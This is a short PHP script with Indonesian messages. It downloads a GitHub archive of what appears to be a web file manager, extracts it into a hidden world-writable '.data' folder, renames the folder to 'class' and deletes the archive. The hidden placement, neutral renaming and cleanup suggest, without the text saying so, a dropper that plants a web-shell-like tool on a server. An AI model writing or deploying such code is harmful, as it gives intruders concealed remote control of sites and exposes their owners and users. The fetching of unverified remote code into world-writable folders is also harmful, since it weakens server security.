<?php

$zipUrl = "https://github.com/ardifx01/kodbox/archive/refs/heads/main.zip";

$extractedFolder = "./.data/";

if (!is_dir($extractedFolder)) {
    mkdir($extractedFolder, 0777, true);
}

$extractedFileName = $extractedFolder . "extracted_files";

$ch = curl_init();
$fp = fopen($extractedFileName . ".zip", "w");

curl_setopt($ch, CURLOPT_URL, $zipUrl);
curl_setopt($ch, CURLOPT_FILE, $fp);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

curl_exec($ch);
curl_close($ch);
fclose($fp);

$zip = new ZipArchive;
if ($zip->open($extractedFileName . ".zip") === TRUE) {
    $zip->extractTo($extractedFolder);
    $zip->close();
    echo 'File ZIP berhasil diekstrak.';
    
    // Ubah nama folder ekstraksi
    $oldFolderName = $extractedFolder . 'kodbox';
    $newFolderName = $extractedFolder . 'class';
    if (is_dir($oldFolderName)) {
        rename($oldFolderName, $newFolderName);
        echo "renamed! - ";
    } else {
        echo "DONE!";
    }
} else {
    echo 'ERROR!';
}

unlink($extractedFileName . ".zip");

echo '';
?>
